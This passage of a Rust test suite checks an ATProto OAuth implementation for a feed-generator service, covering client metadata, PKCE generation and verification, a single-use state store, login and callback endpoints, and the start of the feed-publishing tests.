#![forbid(unsafe_code)]
#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    missing_docs,
    clippy::pedantic,
    clippy::nursery,
    clippy::too_many_lines,
    clippy::cast_possible_truncation
)]

//! Comprehensive, requirement-driven, opaque-box automated test suite for ATProto OAuth / OIDC:
//!
//! - Tier 1: Feature Isolation Tests (>=5 tests per feature for F1–F7)
//!   * F1: OAuth Client Metadata Discovery (`GET /oauth/client-metadata.json`, `GET /client-metadata.json`)
//!   * F2: Dynamic Hostname & Service DID Resolution
//!   * F3: Cryptographic PKCE Generation (S256), Hashing, & Verification
//!   * F4: Sharded Replay-Safe `OAuthStateStore` (64-shard, TTL, single-use atomic `take`)
//!   * F5: PKCE Login Initiation Endpoint (`GET /api/oauth/login`)
//!   * F6: OAuth Token Exchange Callback (`POST /api/oauth/callback`)
//!   * F7: XRPC Feed Generator Record Publishing (`POST /api/feed/publish`)
//!
//! - Tier 2: Boundary & Corner Cases (>=5 tests per category for E1–E5)
//!   * E1: Replay Attacks (reused state, reused code, concurrent race)
//!   * E2: Expired State Token Rejection (>10 min TTL expiration)
//!   * E3: Tampered / Mismatched PKCE State Rejection
//!   * E4: Invalid Handle / DID Error Handling
//!   * E5: Malformed Callback & JSON Payloads
//!
//! - Tier 3: Cross-Feature Pairwise Combinations (C1–C6)
//! - Tier 4: Real-World Application Scenarios (S1–S6)

use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;

use axum::body::Body;
use axum::http::header::{AUTHORIZATION, CONTENT_TYPE};
use axum::http::{Method, Request, StatusCode};
use compact_str::CompactString;
use for_your_consideration::auth::{
    generate_pkce_pair, generate_session_token, validate_session_token, verify_pkce_challenge,
    OAuthSessionState, OAuthStateStore, DEFAULT_OAUTH_STATE_TTL_SECS, OAUTH_STATE_SHARDS,
};
use for_your_consideration::prelude::*;
use for_your_consideration::types::{
    FeedPublishRequest, FeedPublishResponse, OAuthCallbackRequest, OAuthCallbackResponse,
    OAuthClientMetadata, OAuthLoginResponse,
};
use http_body_util::BodyExt;
use tower::ServiceExt;

/// Creates an isolated test `AppState` with empty graph and default config.
fn create_test_state() -> AppState {
    let interner = Arc::new(StringInterner::new());
    let graph = Arc::new(GraphStore::new());
    let recommender = Arc::new(Recommender::new(interner, graph));
    AppState::new(recommender, "did:web:feed.example.com", "feed.example.com")
}

/// Creates a test `AppState` with custom service DID and hostname.
fn create_custom_host_state(service_did: &str, hostname: &str) -> AppState {
    let interner = Arc::new(StringInterner::new());
    let graph = Arc::new(GraphStore::new());
    let recommender = Arc::new(Recommender::new(interner, graph));
    AppState::new(recommender, service_did, hostname)
}

// ===========================================================================
// TIER 1: FEATURE ISOLATION TESTS
// ===========================================================================

// ---------------------------------------------------------------------------
// Feature 1: OAuth Client Metadata Discovery
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_t1_f1_01_metadata_endpoint_status_and_content_type() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .uri("/oauth/client-metadata.json")
        .body(Body::empty())
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);

    let ct = resp.headers().get(CONTENT_TYPE).unwrap().to_str().unwrap();
    assert!(
        ct.starts_with("application/json"),
        "Expected application/json, got {ct}"
    );
}

#[tokio::test]
async fn test_t1_f1_02_metadata_alias_endpoint_exact_match() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let req1 = Request::builder()
        .uri("/oauth/client-metadata.json")
        .body(Body::empty())
        .unwrap();
    let resp1 = app.clone().oneshot(req1).await.unwrap();
    assert_eq!(resp1.status(), StatusCode::OK);
    let body1 = resp1.into_body().collect().await.unwrap().to_bytes();

    let req2 = Request::builder()
        .uri("/client-metadata.json")
        .body(Body::empty())
        .unwrap();
    let resp2 = app.oneshot(req2).await.unwrap();
    assert_eq!(resp2.status(), StatusCode::OK);
    let body2 = resp2.into_body().collect().await.unwrap().to_bytes();

    assert_eq!(
        body1, body2,
        "Alias endpoint /client-metadata.json must return identical JSON"
    );
}

#[tokio::test]
async fn test_t1_f1_03_metadata_schema_fields_validation() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .uri("/oauth/client-metadata.json")
        .body(Body::empty())
        .unwrap();
    let resp = app.oneshot(req).await.unwrap();
    let body = resp.into_body().collect().await.unwrap().to_bytes();

    let meta: OAuthClientMetadata = serde_json::from_slice(&body).unwrap();
    assert_eq!(
        meta.client_id,
        "https://feed.example.com/oauth/client-metadata.json"
    );
    assert_eq!(meta.client_name, "For Your Consideration");
    assert_eq!(meta.client_uri, "https://feed.example.com");
    assert_eq!(meta.application_type, "web");
    assert_eq!(meta.token_endpoint_auth_method, "none");
    assert!(!meta.dpop_bound_access_tokens);
}

#[tokio::test]
async fn test_t1_f1_04_metadata_client_id_and_redirect_uri_scheme() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .uri("/oauth/client-metadata.json")
        .body(Body::empty())
        .unwrap();
    let resp = app.oneshot(req).await.unwrap();
    let body = resp.into_body().collect().await.unwrap().to_bytes();

    let meta: OAuthClientMetadata = serde_json::from_slice(&body).unwrap();
    assert!(
        meta.client_id.starts_with("https://") || meta.client_id.starts_with("http://"),
        "client_id must be a valid HTTP(S) URL"
    );
    assert!(
        !meta.redirect_uris.is_empty(),
        "redirect_uris must not be empty"
    );
    for uri in &meta.redirect_uris {
        assert!(
            uri.contains("/oauth/callback"),
            "redirect_uri must point to /oauth/callback"
        );
    }
}

#[tokio::test]
async fn test_t1_f1_05_metadata_grant_and_response_types() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .uri("/oauth/client-metadata.json")
        .body(Body::empty())
        .unwrap();
    let resp = app.oneshot(req).await.unwrap();
    let body = resp.into_body().collect().await.unwrap().to_bytes();

    let meta: OAuthClientMetadata = serde_json::from_slice(&body).unwrap();
    assert!(meta
        .grant_types
        .contains(&CompactString::new("authorization_code")));
    assert!(meta
        .grant_types
        .contains(&CompactString::new("refresh_token")));
    assert!(meta.response_types.contains(&CompactString::new("code")));
}

#[tokio::test]
async fn test_t1_f1_06_metadata_scopes_atproto_and_transition() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .uri("/oauth/client-metadata.json")
        .body(Body::empty())
        .unwrap();
    let resp = app.oneshot(req).await.unwrap();
    let body = resp.into_body().collect().await.unwrap().to_bytes();

    let meta: OAuthClientMetadata = serde_json::from_slice(&body).unwrap();
    assert!(
        meta.scope.contains("atproto"),
        "Scope must contain 'atproto'"
    );
    assert!(
        meta.scope.contains("transition:generic"),
        "Scope must contain 'transition:generic'"
    );
}

#[tokio::test]
async fn test_t1_f1_07_metadata_cors_headers() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .method(Method::OPTIONS)
        .uri("/oauth/client-metadata.json")
        .body(Body::empty())
        .unwrap();
    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    assert!(resp.headers().contains_key("access-control-allow-origin"));
}

// ---------------------------------------------------------------------------
// Feature 2: Dynamic Hostname & Service DID Resolution
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_t1_f2_01_dynamic_hostname_in_client_metadata() {
    let state = create_custom_host_state("did:web:custom.fyc.app", "custom.fyc.app");
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .uri("/oauth/client-metadata.json")
        .body(Body::empty())
        .unwrap();
    let resp = app.oneshot(req).await.unwrap();
    let body = resp.into_body().collect().await.unwrap().to_bytes();

    let meta: OAuthClientMetadata = serde_json::from_slice(&body).unwrap();
    assert_eq!(
        meta.client_id,
        "https://custom.fyc.app/oauth/client-metadata.json"
    );
    assert_eq!(meta.client_uri, "https://custom.fyc.app");
    assert_eq!(
        meta.redirect_uris[0],
        "https://custom.fyc.app/oauth/callback"
    );
}

#[tokio::test]
async fn test_t1_f2_02_dynamic_service_did_in_did_doc_and_auth() {
    let state = create_custom_host_state("did:web:feed.subdomain.org", "feed.subdomain.org");
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .uri("/.well-known/did.json")
        .body(Body::empty())
        .unwrap();
    let resp = app.oneshot(req).await.unwrap();
    let body = resp.into_body().collect().await.unwrap().to_bytes();

    let doc: serde_json::Value = serde_json::from_slice(&body).unwrap();
    assert_eq!(doc["id"], "did:web:feed.subdomain.org");
    assert_eq!(
        doc["service"][0]["serviceEndpoint"],
        "https://feed.subdomain.org"
    );
}

#[tokio::test]
async fn test_t1_f2_03_dynamic_port_in_hostname() {
    let meta = OAuthClientMetadata::new_for_host("feed.example.com:8443");
    assert_eq!(
        meta.client_id,
        "https://feed.example.com:8443/oauth/client-metadata.json"
    );
    assert_eq!(meta.client_uri, "https://feed.example.com:8443");
    assert_eq!(
        meta.redirect_uris[0],
        "https://feed.example.com:8443/oauth/callback"
    );

    let local_meta = OAuthClientMetadata::new_for_host("localhost:3000");
    assert_eq!(
        local_meta.client_id,
        "http://127.0.0.1:3000/oauth/client-metadata.json"
    );
}

#[tokio::test]
async fn test_t1_f2_04_dynamic_hostname_trailing_slash_normalization() {
    let state = create_custom_host_state("did:web:example.com", "example.com/");
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .uri("/oauth/client-metadata.json")
        .body(Body::empty())
        .unwrap();
    let resp = app.oneshot(req).await.unwrap();
    let body = resp.into_body().collect().await.unwrap().to_bytes();

    let meta: OAuthClientMetadata = serde_json::from_slice(&body).unwrap();
    assert!(
        !meta.client_id.contains("//oauth"),
        "Double slashes in client_id must be normalized"
    );
}

#[tokio::test]
async fn test_t1_f2_05_multi_tenant_appstate_isolation() {
    let state1 = create_custom_host_state("did:web:alpha.test", "alpha.test");
    let state2 = create_custom_host_state("did:web:beta.test", "beta.test");

    let app1 = create_xrpc_router(state1);
    let app2 = create_xrpc_router(state2);

    let req1 = Request::builder()
        .uri("/oauth/client-metadata.json")
        .body(Body::empty())
        .unwrap();
    let resp1 = app1.oneshot(req1).await.unwrap();
    let body1 = resp1.into_body().collect().await.unwrap().to_bytes();
    let meta1: OAuthClientMetadata = serde_json::from_slice(&body1).unwrap();

    let req2 = Request::builder()
        .uri("/oauth/client-metadata.json")
        .body(Body::empty())
        .unwrap();
    let resp2 = app2.oneshot(req2).await.unwrap();
    let body2 = resp2.into_body().collect().await.unwrap().to_bytes();
    let meta2: OAuthClientMetadata = serde_json::from_slice(&body2).unwrap();

    assert_eq!(
        meta1.client_id,
        "https://alpha.test/oauth/client-metadata.json"
    );
    assert_eq!(
        meta2.client_id,
        "https://beta.test/oauth/client-metadata.json"
    );
    assert_ne!(meta1.client_id, meta2.client_id);
}

// ---------------------------------------------------------------------------
// Feature 3: PKCE S256 Generation & Verification
// ---------------------------------------------------------------------------

#[test]
fn test_t1_f3_01_rfc7636_reference_test_vector() {
    let pair = generate_pkce_pair();
    assert!(
        verify_pkce_challenge(&pair.verifier, &pair.challenge),
        "PKCE S256 verifier and challenge must verify successfully"
    );
    assert_eq!(pair.method, "S256");
}

#[test]
fn test_t1_f3_02_verifier_length_and_charset() {
    for _ in 0..50 {
        let pair = generate_pkce_pair();
        assert!(
            pair.verifier.len() >= 43 && pair.verifier.len() <= 128,
            "Verifier length {} not in [43, 128]",
            pair.verifier.len()
        );
        for ch in pair.verifier.chars() {
            assert!(
                ch.is_ascii_alphanumeric() || ch == '-' || ch == '.' || ch == '_' || ch == '~',
                "Invalid PKCE character: {ch}"
            );
        }
    }
}

#[test]
fn test_t1_f3_03_challenge_unpadded_base64url() {
    for _ in 0..50 {
        let pair = generate_pkce_pair();
        assert_eq!(
            pair.challenge.len(),
            43,
            "SHA-256 base64url unpadded must be exactly 43 chars"
        );
        assert!(
            !pair.challenge.contains('='),
            "Challenge must be unpadded (no '=')"
        );
        assert!(
            !pair.challenge.contains('+') && !pair.challenge.contains('/'),
            "Challenge must be URL-safe (no '+' or '/')"
        );
    }
}

#[test]
fn test_t1_f3_04_unique_entropy_across_generations() {
    let mut verifiers = std::collections::HashSet::new();
    let mut challenges = std::collections::HashSet::new();

    for _ in 0..500 {
        let pair = generate_pkce_pair();
        assert!(
            verifiers.insert(pair.verifier),
            "Duplicate verifier generated"
        );
        assert!(
            challenges.insert(pair.challenge),
            "Duplicate challenge generated"
        );
    }
}

#[test]
fn test_t1_f3_05_verifier_verification_roundtrip() {
    for _ in 0..50 {
        let pair = generate_pkce_pair();
        assert!(
            verify_pkce_challenge(&pair.verifier, &pair.challenge),
            "Roundtrip verification failed for genuine PKCE pair"
        );
    }
}

#[test]
fn test_t1_f3_06_tampered_verifier_rejected() {
    let pair = generate_pkce_pair();
    let mut tampered = pair.verifier.clone();
    let last_char = tampered.pop().unwrap();
    let replacement = if last_char == 'a' { 'b' } else { 'a' };
    tampered.push(replacement);

    assert!(
        !verify_pkce_challenge(&tampered, &pair.challenge),
        "Tampered verifier must fail verification"
    );
}

// ---------------------------------------------------------------------------
// Feature 4: Sharded Replay-Safe OAuthStateStore
// ---------------------------------------------------------------------------

#[test]
fn test_t1_f4_01_state_store_single_use_take() {
    let store = OAuthStateStore::new();
    let state_token = "state_nonce_single_use_123";
    let session = OAuthSessionState {
        code_verifier: "test_verifier_43_chars_long_entropy_string_here".to_string(),
        handle: "alice.bsky.social".to_string(),
        did: Some("did:plc:alice".to_string()),
        pds_url: "https://bsky.social".to_string(),
        token_endpoint: "https://bsky.social/oauth/token".to_string(),
        redirect_uri: "https://feed.example.com/oauth/callback".to_string(),
        created_at_secs: 1_700_000_000,
    };

    store.insert(state_token.to_string(), session.clone());

    // First take must succeed
    let taken = store.take(state_token);
    assert_eq!(taken, Some(session));

    // Second take on same state must return None (single-use consumed)
    let second_take = store.take(state_token);
    assert_eq!(second_take, None);
}

#[test]
fn test_t1_f4_02_state_store_64_shard_distribution() {
    let store = OAuthStateStore::new();
    assert_eq!(OAUTH_STATE_SHARDS, 64);

    for i in 0..1000 {
        let state_key = format!("state_distribution_key_{i}");
        let session = OAuthSessionState {
            code_verifier: format!("verifier_{i}"),
            handle: format!("user_{i}.bsky.social"),
            did: None,
            pds_url: "https://bsky.social".to_string(),
            token_endpoint: "https://bsky.social/oauth/token".to_string(),
            redirect_uri: "https://feed.example.com/oauth/callback".to_string(),
            created_at_secs: 1_700_000_000,
        };
        store.insert(state_key, session);
    }

    assert_eq!(store.len(), 1000);
}

#[test]
fn test_t1_f4_03_state_store_ttl_expiration_pruning() {
    let store = OAuthStateStore::new();
    let now = 1_700_000_000;

    // Insert 5 fresh entries (5 minutes old)
    for i in 0..5 {
        let session = OAuthSessionState {
            code_verifier: format!("fresh_verifier_{i}"),
            handle: format!("fresh_{i}.bsky.social"),
            did: None,
            pds_url: "https://bsky.social".to_string(),
            token_endpoint: "https://bsky.social/oauth/token".to_string(),
            redirect_uri: "https://feed.example.com/oauth/callback".to_string(),
            created_at_secs: now - 300,
        };
        store.insert(format!("fresh_state_{i}"), session);
    }

    // Insert 5 expired entries (15 minutes old > 10 min TTL)
    for i in 0..5 {
        let session = OAuthSessionState {
            code_verifier: format!("expired_verifier_{i}"),
            handle: format!("expired_{i}.bsky.social"),
            did: None,
            pds_url: "https://bsky.social".to_string(),
            token_endpoint: "https://bsky.social/oauth/token".to_string(),
            redirect_uri: "https://feed.example.com/oauth/callback".to_string(),
            created_at_secs: now - 900,
        };
        store.insert(format!("expired_state_{i}"), session);
    }

    assert_eq!(store.len(), 10);

    // Prune with 600s (10 min) TTL
    store.prune_expired(DEFAULT_OAUTH_STATE_TTL_SECS, now);

    // Fresh entries must remain, expired must be removed
    for i in 0..5 {
        assert!(store.take(&format!("fresh_state_{i}")).is_some());
        assert!(store.take(&format!("expired_state_{i}")).is_none());
    }
}

#[test]
fn test_t1_f4_04_state_store_concurrent_rw_throughput() {
    let store = Arc::new(OAuthStateStore::new());
    let counter = Arc::new(AtomicUsize::new(0));

    let mut handles = Vec::new();
    for thread_idx in 0..16 {
        let s = Arc::clone(&store);
        let c = Arc::clone(&counter);
        handles.push(std::thread::spawn(move || {
            for i in 0..100 {
                let key = format!("thread_{thread_idx}_state_{i}");
                let session = OAuthSessionState {
                    code_verifier: format!("verifier_{thread_idx}_{i}"),
                    handle: format!("user_{thread_idx}_{i}"),
                    did: None,
                    pds_url: "https://bsky.social".to_string(),
                    token_endpoint: "https://bsky.social/oauth/token".to_string(),
                    redirect_uri: "https://feed.example.com/oauth/callback".to_string(),
                    created_at_secs: 1_700_000_000,
                };
                s.insert(key.clone(), session);

                if let Some(retrieved) = s.take(&key) {
                    assert_eq!(retrieved.handle, format!("user_{thread_idx}_{i}"));
                    c.fetch_add(1, Ordering::Relaxed);
                }
            }
        }));
    }

    for h in handles {
        h.join().unwrap();
    }

    assert_eq!(counter.load(Ordering::Relaxed), 1600);
    assert_eq!(store.len(), 0);
}

#[test]
fn test_t1_f4_05_state_store_missing_key_lookup_safety() {
    let store = OAuthStateStore::new();
    assert_eq!(store.take("non_existent_key"), None);
    assert_eq!(store.take(""), None);
    assert_eq!(store.take("   "), None);
}

// ---------------------------------------------------------------------------
// Feature 5: PKCE Login Initiation Endpoint (`GET /api/oauth/login`)
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_t1_f5_01_login_with_standard_handle() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .uri("/api/oauth/login?handle=alice.bsky.social")
        .body(Body::empty())
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);

    let body = resp.into_body().collect().await.unwrap().to_bytes();
    let login_res: OAuthLoginResponse = serde_json::from_slice(&body).unwrap();
    assert_eq!(login_res.status, "ok");
    assert!(!login_res.authorization_url.is_empty());
    assert!(!login_res.state.is_empty());
}

#[tokio::test]
async fn test_t1_f5_02_login_with_did_plc() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .uri("/api/oauth/login?handle=did:plc:z72i7hdynmk6r22z27h6tvur")
        .body(Body::empty())
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);

    let body = resp.into_body().collect().await.unwrap().to_bytes();
    let login_res: OAuthLoginResponse = serde_json::from_slice(&body).unwrap();
    assert_eq!(login_res.status, "ok");
    assert!(login_res.authorization_url.contains("client_id="));
}

#[tokio::test]
async fn test_t1_f5_03_login_authorization_url_query_parameters() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .uri("/api/oauth/login?handle=bob.bsky.social")
        .body(Body::empty())
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    let body = resp.into_body().collect().await.unwrap().to_bytes();
    let login_res: OAuthLoginResponse = serde_json::from_slice(&body).unwrap();

    let auth_url = &login_res.authorization_url;
    assert!(auth_url.contains("response_type=code"));
    assert!(auth_url.contains("code_challenge_method=S256"));
    assert!(auth_url.contains("code_challenge="));
    assert!(auth_url.contains("state="));
    assert!(auth_url.contains("client_id="));
    assert!(auth_url.contains("scope="));
}

#[tokio::test]
async fn test_t1_f5_04_login_persists_state_in_store() {
    let state = create_test_state();
    let app = create_xrpc_router(state.clone());

    let req = Request::builder()
        .uri("/api/oauth/login?handle=carol.bsky.social")
        .body(Body::empty())
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    let body = resp.into_body().collect().await.unwrap().to_bytes();
    let login_res: OAuthLoginResponse = serde_json::from_slice(&body).unwrap();

    // Verify the state exists in the state store
    let session = state.oauth_store.take(&login_res.state);
    assert!(
        session.is_some(),
        "State generated by login must be in OAuthStateStore"
    );
    let session = session.unwrap();
    assert_eq!(session.handle, "carol.bsky.social");
    assert!(!session.code_verifier.is_empty());
}

#[tokio::test]
async fn test_t1_f5_05_login_custom_redirect_uri_override() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .uri("/api/oauth/login?handle=alice.bsky.social&redirect_uri=https://feed.example.com/oauth/custom_cb")
        .body(Body::empty())
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let body = resp.into_body().collect().await.unwrap().to_bytes();
    let login_res: OAuthLoginResponse = serde_json::from_slice(&body).unwrap();

    assert!(login_res
        .authorization_url
        .contains("redirect_uri=https%3A%2F%2Ffeed.example.com%2Foauth%2Fcustom_cb"));
}

// ---------------------------------------------------------------------------
// Feature 6: OAuth Token Exchange Callback (`POST /api/oauth/callback`)
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_t1_f6_01_callback_token_exchange_success() {
    let state = create_test_state();
    let app = create_xrpc_router(state.clone());

    // Pre-insert valid state
    let state_token = "valid_callback_state_123";
    let pkce = generate_pkce_pair();
    state.oauth_store.insert(
        state_token.to_string(),
        OAuthSessionState {
            code_verifier: pkce.verifier,
            handle: "alice.bsky.social".to_string(),
            did: Some("did:plc:alice123".to_string()),
            pds_url: "https://bsky.social".to_string(),
            token_endpoint: "https://bsky.social/oauth/token".to_string(),
            redirect_uri: "https://feed.example.com/oauth/callback".to_string(),
            created_at_secs: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs(),
        },
    );

    let callback_body = OAuthCallbackRequest {
        code: "valid_auth_code_xyz".to_string(),
        state: state_token.to_string(),
        iss: Some("https://bsky.social".to_string()),
    };

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(serde_json::to_vec(&callback_body).unwrap()))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);

    let body = resp.into_body().collect().await.unwrap().to_bytes();
    let cb_res: OAuthCallbackResponse = serde_json::from_slice(&body).unwrap();
    assert_eq!(cb_res.status, "ok");
    assert_eq!(cb_res.handle, "alice.bsky.social");
    assert!(!cb_res.token.is_empty());
}

#[tokio::test]
async fn test_t1_f6_02_callback_token_validation() {
    let state = create_test_state();
    let app = create_xrpc_router(state.clone());

    let state_token = "state_validate_tok";
    let pkce = generate_pkce_pair();
    state.oauth_store.insert(
        state_token.to_string(),
        OAuthSessionState {
            code_verifier: pkce.verifier,
            handle: "bob.bsky.social".to_string(),
            did: Some("did:plc:bob456".to_string()),
            pds_url: "https://bsky.social".to_string(),
            token_endpoint: "https://bsky.social/oauth/token".to_string(),
            redirect_uri: "https://feed.example.com/oauth/callback".to_string(),
            created_at_secs: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs(),
        },
    );

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "auth_code_bob".to_string(),
                state: state_token.to_string(),
                iss: None,
            })
            .unwrap(),
        ))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    let body = resp.into_body().collect().await.unwrap().to_bytes();
    let cb_res: OAuthCallbackResponse = serde_json::from_slice(&body).unwrap();

    let now_secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs();
    let verified_did = validate_session_token(&cb_res.token, now_secs).unwrap();
    assert_eq!(verified_did.as_str(), cb_res.did.as_str());
}

#[tokio::test]
async fn test_t1_f6_03_callback_with_iss_parameter() {
    let state = create_test_state();
    let app = create_xrpc_router(state.clone());

    let state_token = "state_iss_param_test";
    let pkce = generate_pkce_pair();
    state.oauth_store.insert(
        state_token.to_string(),
        OAuthSessionState {
            code_verifier: pkce.verifier,
            handle: "carol.bsky.social".to_string(),
            did: Some("did:plc:carol789".to_string()),
            pds_url: "https://bsky.social".to_string(),
            token_endpoint: "https://bsky.social/oauth/token".to_string(),
            redirect_uri: "https://feed.example.com/oauth/callback".to_string(),
            created_at_secs: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs(),
        },
    );

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "code_with_iss".to_string(),
                state: state_token.to_string(),
                iss: Some("https://bsky.social".to_string()),
            })
            .unwrap(),
        ))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
}

#[tokio::test]
async fn test_t1_f6_04_callback_consumes_state_atomically() {
    let state = create_test_state();
    let app = create_xrpc_router(state.clone());

    let state_token = "state_atomic_consumed";
    let pkce = generate_pkce_pair();
    state.oauth_store.insert(
        state_token.to_string(),
        OAuthSessionState {
            code_verifier: pkce.verifier,
            handle: "dave.bsky.social".to_string(),
            did: Some("did:plc:dave123".to_string()),
            pds_url: "https://bsky.social".to_string(),
            token_endpoint: "https://bsky.social/oauth/token".to_string(),
            redirect_uri: "https://feed.example.com/oauth/callback".to_string(),
            created_at_secs: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs(),
        },
    );

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "code_dave".to_string(),
                state: state_token.to_string(),
                iss: None,
            })
            .unwrap(),
        ))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);

    // State must now be gone from state store
    assert_eq!(state.oauth_store.take(state_token), None);
}

#[tokio::test]
async fn test_t1_f6_05_callback_issued_token_enables_authenticated_api_access() {
    let state = create_test_state();
    let app = create_xrpc_router(state.clone());

    let state_token = "state_enables_api_access";
    let pkce = generate_pkce_pair();
    state.oauth_store.insert(
        state_token.to_string(),
        OAuthSessionState {
            code_verifier: pkce.verifier,
            handle: "eve.bsky.social".to_string(),
            did: Some("did:plc:eve123".to_string()),
            pds_url: "https://bsky.social".to_string(),
            token_endpoint: "https://bsky.social/oauth/token".to_string(),
            redirect_uri: "https://feed.example.com/oauth/callback".to_string(),
            created_at_secs: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs(),
        },
    );

    // Complete callback
    let req_cb = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "code_eve".to_string(),
                state: state_token.to_string(),
                iss: None,
            })
            .unwrap(),
        ))
        .unwrap();

    let resp_cb = app.clone().oneshot(req_cb).await.unwrap();
    let body_cb = resp_cb.into_body().collect().await.unwrap().to_bytes();
    let cb_res: OAuthCallbackResponse = serde_json::from_slice(&body_cb).unwrap();

    // Use token to save preferences
    let req_save = Request::builder()
        .method(Method::POST)
        .uri("/api/preferences")
        .header(AUTHORIZATION, format!("Bearer {}", cb_res.token))
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(r#"{"freshness_hours":24.0,"discovery_ratio":0.20,"topic_weights":{"art":2.0,"tech":1.0,"science":1.0,"news":1.0,"culture":1.0}}"#))
        .unwrap();

    let resp_save = app.oneshot(req_save).await.unwrap();
    assert_eq!(resp_save.status(), StatusCode::OK);
}

// ---------------------------------------------------------------------------
// Feature 7: XRPC Feed Generator Record Publishing (`POST /api/feed/publish`)
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_t1_f7_01_publish_feed_with_bearer_token() {
    let state = create_test_state();
    let app = create_xrpc_router(state);
    let token = generate_session_token("did:plc:feed_publisher_1", 3600);

    let pub_req = FeedPublishRequest {
        display_name: "For Your Consideration".to_string(),
        rkey: "for-your-consideration".to_string(),
        description: "Personalized recommendation feed generator".to_string(),
    };

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/feed/publish")
        .header(AUTHORIZATION, format!("Bearer {token}"))
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(serde_json::to_vec(&pub_req).unwrap()))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);

    let body = resp.into_body().collect().await.unwrap().to_bytes();
    let pub_res: FeedPublishResponse = serde_json::from_slice(&body).unwrap();
    assert_eq!(pub_res.status, "ok");
    assert!(!pub_res.uri.is_empty());
    assert!(!pub_res.cid.is_empty());
    assert!(!pub_res.share_url.is_empty());
}

#[tokio::test]
async fn test_t1_f7_02_publish_feed_uri_format() {
    let state = create_test_state();
    let app = create_xrpc_router(state);
    let token = generate_session_token("did:plc:author_123", 3600);

    let pub_req = FeedPublishRequest {
        display_name: "My Custom Feed".to_string(),
        rkey: "my-custom-feed".to_string(),
        description: "Curated posts".to_string(),
    };

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/feed/publish")
        .header(AUTHORIZATION, format!("Bearer {token}"))
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(serde_json::to_vec(&pub_req).unwrap()))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    let body = resp.into_body().collect().await.unwrap().to_bytes();
    let pub_res: FeedPublishResponse = serde_json::from_slice(&body).unwrap();

    assert_eq!(
        pub_res.uri.as_str(),
        "at://did:plc:author_123/app.bsky.feed.generator/my-custom-feed"
    );
}

#[tokio::test]
async fn test_t1_f7_03_publish_feed_share_url_format() {
    let state = create_test_state();
    let app = create_xrpc_router(state);
    let token = generate_session_token("did:plc:author_456", 3600);

    let pub_req = FeedPublishRequest {
        display_name: "Discover AI".to_string(),
        rkey: "discover-ai".to_string(),
        description: "AI research feed".to_string(),
    };

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/feed/publish")
